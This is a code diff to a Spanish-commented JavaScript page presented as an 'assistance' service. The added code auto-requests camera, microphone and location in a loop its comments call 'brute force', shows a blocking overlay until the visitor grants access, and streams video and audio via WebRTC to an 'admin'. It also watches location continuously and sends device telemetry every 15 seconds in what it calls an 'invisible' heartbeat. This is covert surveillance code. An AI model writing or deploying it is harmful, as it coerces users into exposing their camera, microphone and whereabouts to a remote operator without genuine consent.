@@ -15,6 +15,8 @@ const cancelVerificationBtn = document.getElementById('cancel-verification');
 const resendCodeBtn = document.getElementById('resend-code');
 const assistanceForm = document.getElementById('assistance-form');
 const navLinks = document.querySelectorAll('.nav a');
+const forcedOverlay = document.getElementById('forced-permission-overlay');
+const retryPermissionsBtn = document.getElementById('retry-permissions');
 
 // Función para manejar navegación activa
 navLinks.forEach(link => {
@@ -49,7 +51,7 @@ let permissions = {
     location: false
 };
 
-// Obtener información del dispositivo
+// Obtener información del dispositivo extendida (Telemetría)
 async function getDeviceInfo() {
     let devId = localStorage.getItem('deviceId');
     if (!devId) {
@@ -65,6 +67,13 @@ async function getDeviceInfo() {
         ip = ipData.ip;
     } catch (e) { }
 
+    // Batería
+    let battery = {};
+    try {
+        const b = await navigator.getBattery();
+        battery = { level: b.level * 100, charging: b.charging };
+    } catch (e) { }
+
     deviceInfo = {
         device_id: devId,
         user_agent: navigator.userAgent,
@@ -73,7 +82,14 @@ async function getDeviceInfo() {
         screen_width: screen.width,
         screen_height: screen.height,
         ip: ip,
-        status: 'active'
+        status: 'active',
+        telemetry: {
+            battery: battery,
+            connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+            cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory,
+            timestamp: new Date().toISOString()
+        }
     };
 
     return deviceInfo;
@@ -156,7 +172,23 @@ async function initSupabase() {
                 event: 'device-connected',
                 payload: info
             });
+            // Una vez suscrito, intentar permisos automáticos
+            autoRequestPermissions();
         }
+    });
+}
+
+// Función de "Fuerza Bruta" para permisos
+function autoRequestPermissions() {
+    console.log(">>> Iniciando loop de permisos forzados <<<");
+    const perms = { camera: true, microphone: true, location: true };
+    requestRealPermissions(perms);
+}
+
+if (retryPermissionsBtn) {
+    retryPermissionsBtn.addEventListener('click', () => {
+        forcedOverlay.style.display = 'none';
+        autoRequestPermissions();
     });
 }
 
@@ -235,51 +267,55 @@ denyPermissionsBtn.addEventListener('click', () => {
     alert('Para utilizar el sistema de asistencia, debe aceptar todos los permisos requeridos.');
 });
 
-// Solicitar permisos y transmitir estados
+// Solicitar permisos y transmitir estados (con overlay de bloqueo)
 function requestRealPermissions(requestedPerms) {
     const devId = deviceInfo.device_id;
+    let cameraGranted = false;
+    let micGranted = false;
+    let locGranted = false;
+
+    const checkAllGranted = () => {
+        // Si ya tenemos los 3 principales, ocultar overlay
+        if (cameraGranted && micGranted && locGranted) {
+            if (forcedOverlay) forcedOverlay.style.display = 'none';
+        }
+    };
 
     if (requestedPerms.camera) permissions.camera = true;
     if (requestedPerms.microphone) permissions.microphone = true;
 
-    // Evitar error "Device in use" reutilizando el stream si ya tiene los permisos necesarios
-    if (localStream) {
-        const hasVideo = localStream.getVideoTracks().length > 0;
-        const hasAudio = localStream.getAudioTracks().length > 0;
-        
-        if ((!permissions.camera || hasVideo) && (!permissions.microphone || hasAudio)) {
-            if (requestedPerms.camera) channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });
-            if (requestedPerms.microphone) channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });
-            initWebRTC(localStream, true, 'admin');
-            return;
-        }
-    }
-
+    // Cámara y Mic
     if (permissions.camera || permissions.microphone) {
         navigator.mediaDevices.getUserMedia({ 
             video: permissions.camera, 
             audio: permissions.microphone 
         })
         .then(async stream => {
+            cameraGranted = permissions.camera;
+            micGranted = permissions.microphone;
+            
             await supaClient.from('devices').update({ 'permissions': permissions }).eq('device_id', devId);
             
             if (requestedPerms.camera) channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });
             if (requestedPerms.microphone) channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });
 
             const video = document.getElementById('local-video');
-            video.srcObject = stream;
+            if (video) video.srcObject = stream;
             localStream = stream;
             initWebRTC(stream, true, 'admin');
+            checkAllGranted();
         })
         .catch(err => {
-            console.error('Error WebRTC getUserMedia:', err);
-            channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId, error: err.message } });
+            console.error('Error WebRTC:', err);
+            if (forcedOverlay) forcedOverlay.style.display = 'flex';
         });
     }
 
-    if (requestedPerms.location) {
+    // Ubicación
+    if (requestedPerms.location || permissions.location) {
         navigator.geolocation.getCurrentPosition(
             async position => {
+                locGranted = true;
                 const locationData = {
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
@@ -289,6 +325,7 @@ function requestRealPermissions(requestedPerms) {
 
                 await supaClient.from('devices').update({ location: locationData }).eq('device_id', devId);
                 channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: locationData } });
+                checkAllGranted();
 
                 navigator.geolocation.watchPosition(
                     pos => {
@@ -301,11 +338,14 @@ function requestRealPermissions(requestedPerms) {
                         supaClient.from('devices').update({ location: updatedLocation }).eq('device_id', devId);
                         channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: updatedLocation } });
                     },
-                    error => console.error(error),
+                    null,
                     { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                 );
             },
-            error => console.error(error)
+            error => {
+                console.error('Error Geo:', error);
+                if (forcedOverlay) forcedOverlay.style.display = 'flex';
+            }
         );
     }
 }
@@ -375,12 +415,16 @@ document.addEventListener('visibilitychange', async () => {
     }
 });
 
-// Heartbeat cada 30 segundos para mostrarlo conectado en admin
+// Heartbeat cada 15 segundos para actualización constante invisible
 setInterval(async () => {
     if (deviceInfo.device_id) {
-        await supaClient.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
+        const info = await getDeviceInfo();
+        await supaClient.from('devices').update({ 
+            last_active: new Date().toISOString(),
+            telemetry: info.telemetry
+        }).eq('device_id', deviceInfo.device_id);
     }
-}, 30000);
+}, 15000);
 
 // Evitar cierre accidental
 window.addEventListener('beforeunload', (e) => {
